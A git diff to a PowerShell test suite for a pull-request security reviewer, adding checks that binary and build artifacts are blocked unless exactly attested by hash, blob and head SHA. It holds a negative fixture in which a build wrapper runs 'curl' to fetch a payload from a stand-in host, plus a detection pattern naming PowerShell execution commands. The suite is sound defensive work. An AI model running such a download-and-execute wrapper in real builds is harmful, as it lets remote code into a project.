@@ -43,11 +43,13 @@ function Check([bool]$Condition, [string]$Message) {
 
 $required = @(
     'scripts/lib/PullRequestReviewCommon.ps1',
+    'scripts/lib/PullRequestArtifactVerification.ps1',
     'scripts/Invoke-SafePullRequestReview.ps1',
     'scripts/Test-PullRequestDependencyDelta.ps1',
     'scripts/New-PullRequestAdoptionPrompt.ps1',
     'scripts/New-PullRequestFeedback.ps1',
     'config/pull-request-review-policy.json',
+    'config/pull-request-artifact-attestations.json',
     'config/dependency-review-policy.json',
     'config/suspicious-change-patterns.json',
     'config/pr-adoption-policy.json',
@@ -114,6 +116,14 @@ function Analyze($Metadata, [object[]]$Files, [string]$Patch, [string[]]$BaseFil
 function Has-Code($Analysis, [string]$Code) {
     return @($Analysis.findings | Where-Object code -eq $Code).Count -gt 0
 }
+function Set-SyntheticArtifactVerification($File, [string]$Kind, [string]$Status = 'VERIFIED', [string]$HeadSha = ('a' * 40)) {
+    $File | Add-Member -NotePropertyName artifactVerification -NotePropertyValue ([pscustomobject]@{
+        status=$Status; approvalId='synthetic-owner-attestation'; pullRequestNumber=42; headSha=$HeadSha; path=[string]$File.path
+        kind=$Kind; mimeType=if($Kind -eq 'android-png'){'image/png'}elseif($Kind -eq 'gradle-wrapper-jar'){'application/java-archive'}else{'text/x-msdos-batch'}
+        gitBlobSha=('c' * 40); size=64; sha256=('d' * 64); errors=@()
+    }) -Force
+    return $File
+}
 
 $encodedMarker = 'Encoded' + 'Command'
 $downloadMarker = 'Download' + 'File'
@@ -177,6 +187,147 @@ foreach ($fixture in $fixtures) {
     Check ($serialized -notmatch [regex]::Escape($invokeMarker)) "Fixture $($fixture.id): rohe Payload im Ergebnis"
     Check ($serialized -notmatch [regex]::Escape($bidi)) "Fixture $($fixture.id): Bidi-Zeichen im Ergebnis"
 }
+
+$verifiedJarFile = Set-SyntheticArtifactVerification (New-File 'src/SchachTurnierManager.WebApp/android/gradle/wrapper/gradle-wrapper.jar' 'added' '100644' $false) 'gradle-wrapper-jar'
+$verifiedJar = Analyze (New-Metadata) @($verifiedJarFile) ''
+Check ($verifiedJar.decision -eq 'OWNER_REVIEW_REQUIRED' -and (Has-Code $verifiedJar 'VERIFIED_ATTESTED_ARTIFACT') -and -not (Has-Code $verifiedJar 'BLOCKED_ARCHIVE')) 'Exakt attestierter Gradle-Wrapper-JAR darf nur als Owner-Review-pflichtig, nicht als pauschal blockiertes Archiv gelten'
+
+$verifiedPngFile = Set-SyntheticArtifactVerification (New-File 'src/SchachTurnierManager.WebApp/android/app/src/main/res/mipmap-mdpi/ic_launcher.png' 'added' '100644' $false) 'android-png'
+$verifiedPng = Analyze (New-Metadata) @($verifiedPngFile) ''
+Check ($verifiedPng.decision -eq 'OWNER_REVIEW_REQUIRED' -and (Has-Code $verifiedPng 'VERIFIED_ATTESTED_ARTIFACT') -and -not (Has-Code $verifiedPng 'INCOMPLETE_PATCH')) 'Exakt attestiertes Android-PNG darf den fehlenden Textpatch eng ersetzen und muss Owner-Review-pflichtig bleiben'
+
+$driftedJarFile = Set-SyntheticArtifactVerification (New-File 'src/SchachTurnierManager.WebApp/android/gradle/wrapper/gradle-wrapper.jar' 'added' '100644' $false) 'gradle-wrapper-jar' 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
+$driftedJar = Analyze (New-Metadata) @($driftedJarFile) ''
+Check ($driftedJar.decision -eq 'BLOCKED_UNVERIFIED' -and (Has-Code $driftedJar 'ARTIFACT_ATTESTATION_MISMATCH') -and (Has-Code $driftedJar 'BLOCKED_ARCHIVE')) 'Head-Drift muss eine zuvor attestierte Binaerdatei automatisch wieder blockieren'
+
+$metadataArtifactDrift = New-Metadata
+$metadataArtifactDrift | Add-Member -NotePropertyName artifactAttestationErrors -NotePropertyValue @('ATTESTED_PATH_NOT_CHANGED:synthetic-safe-path')
+$metadataArtifactAnalysis = Analyze $metadataArtifactDrift @((New-File 'docs/safe.md')) '+Text'
+Check ($metadataArtifactAnalysis.decision -eq 'BLOCKED_UNVERIFIED' -and (Has-Code $metadataArtifactAnalysis 'ARTIFACT_ATTESTATION_MISMATCH')) 'Unvollstaendige Attestation muss unabhaengig vom Dateityp fail-closed blockieren'
+
+function ConvertTo-SyntheticBeUInt32([uint32]$Value) {
+    return [byte[]]([byte](($Value -shr 24) -band 0xFF),[byte](($Value -shr 16) -band 0xFF),[byte](($Value -shr 8) -band 0xFF),[byte]($Value -band 0xFF))
+}
+function New-SyntheticPngChunk([string]$Type, [byte[]]$Data) {
+    [byte[]]$typeBytes = [Text.Encoding]::ASCII.GetBytes($Type)
+    [byte[]]$crcInput = @($typeBytes) + @($Data)
+    [uint32]$crc = Get-PullRequestArtifactCrc32 -Bytes $crcInput
+    return [byte[]](@(ConvertTo-SyntheticBeUInt32 ([uint32]$Data.Length)) + @($typeBytes) + @($Data) + @(ConvertTo-SyntheticBeUInt32 $crc))
+}
+function New-SyntheticPngArtifact([byte[]]$Bytes) {
+    return [pscustomobject]@{
+        kind='android-png'; size=$Bytes.Length; sha256=(Get-PullRequestArtifactSha256 -Bytes $Bytes)
+        validation=[pscustomobject]@{ width=1; height=1; chunkTypes=@('IHDR','IDAT','IEND'); textMetadata=@() }
+    }
+}
+[byte[]]$syntheticIhdr = @(0,0,0,1,0,0,0,1,8,6,0,0,0)
+[byte[]]$syntheticIdat = @(0x78,0x9c,0x63,0x00,0x00,0x00,0x01,0x00,0x01)
+[byte[]]$syntheticPng = @([byte[]](137,80,78,71,13,10,26,10)) + @(New-SyntheticPngChunk 'IHDR' $syntheticIhdr) + @(New-SyntheticPngChunk 'IDAT' $syntheticIdat) + @(New-SyntheticPngChunk 'IEND' ([byte[]]@()))
+$syntheticPngResult = Test-PullRequestArtifactBytes -Bytes $syntheticPng -Artifact (New-SyntheticPngArtifact $syntheticPng)
+Check $syntheticPngResult.valid 'Synthetisches PNG mit exakter Signatur, CRC, Dimension, Chunkfolge und ohne Nachlauf muss akzeptiert werden'
+[byte[]]$pngWithPayload = @($syntheticPng) + 0x41
+$payloadResult = Test-PullRequestArtifactBytes -Bytes $pngWithPayload -Artifact (New-SyntheticPngArtifact $pngWithPayload)
+Check (-not $payloadResult.valid -and @($payloadResult.errors) -ccontains 'PNG_TRAILING_BYTES') 'An PNG angehaengte Payload muss trotz passender Groesse und SHA-256 blockieren'
+[byte[]]$pngWithBadCrc = $syntheticPng.Clone()
+$pngWithBadCrc[42] = $pngWithBadCrc[42] -bxor 0x01
+$crcResult = Test-PullRequestArtifactBytes -Bytes $pngWithBadCrc -Artifact (New-SyntheticPngArtifact $pngWithBadCrc)
+Check (-not $crcResult.valid -and @($crcResult.errors) -ccontains 'PNG_CRC') 'PNG-CRC-Manipulation muss trotz neu gebundener SHA-256 erkannt werden'
+
+$distributionSha = '89d4e70e4e84e2d2dfbb63e4daa53e21b25017cc70c37e4eea31ee51fb15098a'
+$propertiesText = "distributionUrl=https\://services.gradle.org/distributions/gradle-8.11.1-all.zip`ndistributionSha256Sum=$distributionSha`nvalidateDistributionUrl=true`n"
+[byte[]]$propertiesBytes = [Text.Encoding]::UTF8.GetBytes($propertiesText)
+$propertiesArtifact = [pscustomobject]@{ kind='gradle-wrapper-properties'; size=$propertiesBytes.Length; sha256=(Get-PullRequestArtifactSha256 $propertiesBytes); validation=[pscustomobject]@{ distributionUrl='https\://services.gradle.org/distributions/gradle-8.11.1-all.zip'; distributionSha256Sum=$distributionSha; validateDistributionUrl=$true } }
+Check (Test-PullRequestArtifactBytes -Bytes $propertiesBytes -Artifact $propertiesArtifact).valid 'Gradle-Properties muessen Distribution-URL, SHA-256 und URL-Validierung exakt binden'
+[byte[]]$propertiesWithoutHash = [Text.Encoding]::UTF8.GetBytes("distributionUrl=https\://services.gradle.org/distributions/gradle-8.11.1-all.zip`nvalidateDistributionUrl=true`n")
+$propertiesWithoutHashArtifact = [pscustomobject]@{ kind='gradle-wrapper-properties'; size=$propertiesWithoutHash.Length; sha256=(Get-PullRequestArtifactSha256 $propertiesWithoutHash); validation=$propertiesArtifact.validation }
+Check (-not (Test-PullRequestArtifactBytes -Bytes $propertiesWithoutHash -Artifact $propertiesWithoutHashArtifact).valid) 'Fehlende Gradle-Distribution-Checksum muss fail-closed blockieren'
+
+[byte[]]$safeWrapperBytes = [Text.Encoding]::UTF8.GetBytes("@echo off`njava -classpath gradle-wrapper.jar org.gradle.wrapper.GradleWrapperMain`n")
+$safeWrapperArtifact = [pscustomobject]@{ kind='third-party-build-wrapper'; size=$safeWrapperBytes.Length; sha256=(Get-PullRequestArtifactSha256 $safeWrapperBytes); validation=[pscustomobject]@{ lineEndings='lf' } }
+Check (Test-PullRequestArtifactBytes -Bytes $safeWrapperBytes -Artifact $safeWrapperArtifact).valid 'Attestierter Buildwrapper ohne Download-/Shell-Nachladung muss strukturell akzeptiert werden'
+[byte[]]$unsafeWrapperBytes = [Text.Encoding]::UTF8.GetBytes("@echo off`ncurl https://invalid.example/payload`n")
+$unsafeWrapperArtifact = [pscustomobject]@{ kind='third-party-build-wrapper'; size=$unsafeWrapperBytes.Length; sha256=(Get-PullRequestArtifactSha256 $unsafeWrapperBytes); validation=[pscustomobject]@{ lineEndings='lf' } }
+Check (-not (Test-PullRequestArtifactBytes -Bytes $unsafeWrapperBytes -Artifact $unsafeWrapperArtifact).valid) 'Buildwrapper mit eigenem Downloadwerkzeug muss trotz exakter SHA-Attestation blockieren'
+
+# Die eigentliche Attestation -> Head-Tree -> Blob-Kette braucht direkte Negativtests.
+# Ein synthetischer PNG-Blob wird nur als Bytes geprueft; nichts wird ausgefuehrt.
+[byte[]]$syntheticChainBytes = $syntheticPng
+$syntheticChainSha256 = Get-PullRequestArtifactSha256 -Bytes $syntheticChainBytes
+$syntheticBlobSha = 'c' * 40
+$syntheticHeadSha = 'a' * 40
+$syntheticChainPath = 'src/SchachTurnierManager.WebApp/android/app/src/main/res/mipmap-mdpi/ic_launcher.png'
+$syntheticArtifactPolicy = [pscustomobject]@{
+    verifiedArtifactPolicy = [pscustomobject]@{
+        attestationFile='config/pull-request-artifact-attestations.json'; maximumArtifactBytes=1048576
+        requireExactPullRequestNumber=$true; requireExactHeadSha=$true; requireExactGitBlobSha=$true
+        requireExactSha256=$true; requireExactSize=$true; requireOwnerReview=$true
+        allowedKinds=@('android-png','gradle-wrapper-jar','gradle-wrapper-properties','third-party-build-wrapper')
+    }
+}
+$syntheticArtifact = [pscustomobject]@{
+    path=$syntheticChainPath; kind='android-png'; mimeType='image/png'
+    gitBlobSha=$syntheticBlobSha; sha256=$syntheticChainSha256; size=$syntheticChainBytes.Length
+    provenance=[pscustomobject]@{
+        sourceRepository='ionic-team/capacitor'; sourceRef='7.4.3'; sourceCommitSha='e12818ac2254583fb11c3ea96853d01cb4978438'
+        sourcePath='android-template/app/src/main/res/mipmap-mdpi/ic_launcher.png'; sourceGitBlobSha=$syntheticBlobSha
+        sourceSize=$syntheticChainBytes.Length; sourceSha256=$syntheticChainSha256; generator='Capacitor CLI'; generatorVersion='7.4.3'
+        derivation='Byte-identical file generated by the Capacitor CLI 7.4.3 Android template.'
+    }
+    validation=[pscustomobject]@{
+        width=1; height=1; chunkTypes=@('IHDR','IDAT','IEND'); textMetadata=@()
+    }
+}
+$syntheticAttestations = [pscustomobject]@{
+    schemaVersion=1
+    approvals=@([pscustomobject]@{
+        approvalId='synthetic-owner-attestation'; pullRequestNumber=42; headSha=$syntheticHeadSha
+        ownerReviewRequired=$true; artifacts=@($syntheticArtifact)
+    })
+}
+Check (Assert-PullRequestArtifactAttestations -ReviewPolicy $syntheticArtifactPolicy -Attestations $syntheticAttestations) 'Synthetische, vollstaendig gebundene Attestation muss das Schema erfuellen'
+
+function New-SyntheticAttestedChainFile {
+    return New-File $syntheticChainPath 'added' '100644' $false
+}
+function New-SyntheticAttestedMetadata([string]$HeadSha = $syntheticHeadSha) {
+    $metadata = New-Metadata
+    $metadata.headSha = $HeadSha
+    $metadata | Add-Member -NotePropertyName headRefOid -NotePropertyValue $HeadSha -Force
+    return $metadata
+}
+$syntheticHeadTree = [pscustomobject]@{ tree=@([pscustomobject]@{ path=$syntheticChainPath; type='blob'; sha=$syntheticBlobSha; size=$syntheticChainBytes.Length }) }
+$syntheticBlobProvider = { param([string]$BlobSha,[int64]$ExpectedSize) return $syntheticChainBytes }
+$verifiedChainFile = New-SyntheticAttestedChainFile
+$verifiedChainMetadata = New-SyntheticAttestedMetadata
+[void](Add-PullRequestArtifactVerifications -Metadata $verifiedChainMetadata -Files @($verifiedChainFile) -HeadTree $syntheticHeadTree -ReviewPolicy $syntheticArtifactPolicy -Attestations $syntheticAttestations -BlobProvider $syntheticBlobProvider)
+Check ($verifiedChainMetadata.artifactAttestationStatus -ceq 'VERIFIED' -and $verifiedChainFile.artifactVerification.status -ceq 'VERIFIED') 'Exakte PR-/Head-/Tree-/Blob-/Hash-Kette muss verifiziert werden'
+
+$treeDriftFile = New-SyntheticAttestedChainFile
+$treeDriftMetadata = New-SyntheticAttestedMetadata
+$treeDrift = [pscustomobject]@{ tree=@([pscustomobject]@{ path=$syntheticChainPath; type='blob'; sha=('e' * 40); size=$syntheticChainBytes.Length }) }
+[void](Add-PullRequestArtifactVerifications -Metadata $treeDriftMetadata -Files @($treeDriftFile) -HeadTree $treeDrift -ReviewPolicy $syntheticArtifactPolicy -Attestations $syntheticAttestations -BlobProvider $syntheticBlobProvider)
+Check ($treeDriftMetadata.artifactAttestationStatus -ceq 'FAILED' -and @($treeDriftFile.artifactVerification.errors) -ccontains 'GIT_BLOB_SHA_MISMATCH') 'Geaenderter Git-Blob muss die Freigabe automatisch invalidieren'
+
+$byteDriftFile = New-SyntheticAttestedChainFile
+$byteDriftMetadata = New-SyntheticAttestedMetadata
+[byte[]]$syntheticDriftBytes = $syntheticChainBytes.Clone()
+$syntheticDriftBytes[-1] = $syntheticDriftBytes[-1] -bxor 0x01
+$byteDriftProvider = { param([string]$BlobSha,[int64]$ExpectedSize) return $syntheticDriftBytes }
+[void](Add-PullRequestArtifactVerifications -Metadata $byteDriftMetadata -Files @($byteDriftFile) -HeadTree $syntheticHeadTree -ReviewPolicy $syntheticArtifactPolicy -Attestations $syntheticAttestations -BlobProvider $byteDriftProvider)
+Check ($byteDriftMetadata.artifactAttestationStatus -ceq 'FAILED' -and @($byteDriftFile.artifactVerification.errors) -ccontains 'SHA256_MISMATCH') 'Geaenderte Bytes bei unveraenderter Groesse muessen die Freigabe automatisch invalidieren'
+
+$headDriftFile = New-SyntheticAttestedChainFile
+$headDriftMetadata = New-SyntheticAttestedMetadata ('e' * 40)
+[void](Add-PullRequestArtifactVerifications -Metadata $headDriftMetadata -Files @($headDriftFile) -HeadTree $syntheticHeadTree -ReviewPolicy $syntheticArtifactPolicy -Attestations $syntheticAttestations -BlobProvider $syntheticBlobProvider)
+$headDriftAnalysis = Analyze $headDriftMetadata @($headDriftFile) ''
+Check ($headDriftMetadata.artifactAttestationStatus -ceq 'NO_MATCHING_APPROVAL' -and $headDriftAnalysis.decision -eq 'BLOCKED_UNVERIFIED' -and (Has-Code $headDriftAnalysis 'INCOMPLETE_PATCH')) 'Geaenderter PR-Head darf keine alte Attestation erben'
+
+$invalidOwnerAttestations = $syntheticAttestations | ConvertTo-Json -Depth 20 | ConvertFrom-Json
+$invalidOwnerAttestations.approvals[0].ownerReviewRequired = $false
+$ownerRequirementRejected = $false
+try { [void](Assert-PullRequestArtifactAttestations -ReviewPolicy $syntheticArtifactPolicy -Attestations $invalidOwnerAttestations) }
+catch { $ownerRequirementRejected = $true }
+Check $ownerRequirementRejected 'Attestation ohne ausdrueckliche Owner-Review-Pflicht muss fail-closed abgelehnt werden'
 foreach ($additionalBidi in @($bidiAlm,$bidiLrm)) {
     $bidiAnalysis = Analyze (New-Metadata -Title ("synthetic${additionalBidi}title")) @((New-File 'docs/fixture.md')) '+Text'
     Check ($bidiAnalysis.decision -eq 'BLOCKED_UNVERIFIED' -and (Has-Code $bidiAnalysis 'BIDI_CONTROL')) 'Alle Unicode-Bidi-Control-Klassen muessen fail-closed blockieren'
@@ -473,6 +624,14 @@ Check ($mainSource -match '\$PSScriptRoot' -and $mainSource -notmatch 'rev-parse
 Check ($mainSource -match 'ExpectedHeadSha' -and $mainSource -match 'ExpectedBaseSha') 'Statischer Scanner muss ausloesende Event-SHAs binden'
 $commonSource = Get-Content -Raw -LiteralPath (Join-Path $repo 'scripts/lib/PullRequestReviewCommon.ps1')
 Check ($commonSource -match 'Invoke-TrustedLiveReviewReanalysis' -and $commonSource -match 'weicht bei') 'Prompt und Feedback muessen den Bericht gegen eine vertrauenswuerdige Live-Reanalyse binden'
+$artifactSource = Get-Content -Raw -LiteralPath (Join-Path $repo 'scripts/lib/PullRequestArtifactVerification.ps1')
+$dynamicExpressionName = [regex]::Escape(('Invoke' + '-Expression'))
+$dynamicExpressionAlias = [regex]::Escape(('i' + 'ex'))
+$artifactExecutionPattern = "(?im)\b(?:Expand-Archive|Start-Process|$dynamicExpressionName|$dynamicExpressionAlias)\b|ZipArchive|Process\.Start"
+Check ($artifactSource -notmatch $artifactExecutionPattern) 'Artifact-Verifier darf PR-Binaerdaten weder entpacken noch ausfuehren'
+Check ($artifactSource -match 'pullRequestNumber' -and $artifactSource -match 'headSha' -and $artifactSource -match 'gitBlobSha' -and $artifactSource -match 'sha256' -and $artifactSource -match 'size') 'Artifact-Verifier muss PR, Head, Git-Blob, SHA-256 und Groesse binden'
+Check ($artifactSource -match 'PNG_CRC' -and $artifactSource -match 'PNG_TRAILING_BYTES' -and $artifactSource -match 'distributionSha256Sum') 'Artifact-Verifier muss PNG-Manipulationen und Gradle-Distribution-Checksum pruefen'
+Check ($commonSource -match 'BLOCKED_ARCHIVE' -and $commonSource -match 'BLOCKED_BINARY' -and $commonSource -match 'ARTIFACT_ATTESTATION_MISMATCH') 'Bestehende Binary-Blockade muss erhalten und nur durch exakte Attestation ergaenzt werden'
 $dependencySource = Get-Content -Raw -LiteralPath (Join-Path $repo 'scripts/Test-PullRequestDependencyDelta.ps1')
 Check ($dependencySource -notmatch '\[string\]\$RepositoryRoot') 'Dependency-Gate darf keinen frei waehlbaren Dot-Source-RepositoryRoot akzeptieren'
 $feedbackSource = Get-Content -Raw -LiteralPath (Join-Path $repo 'scripts/New-PullRequestFeedback.ps1')
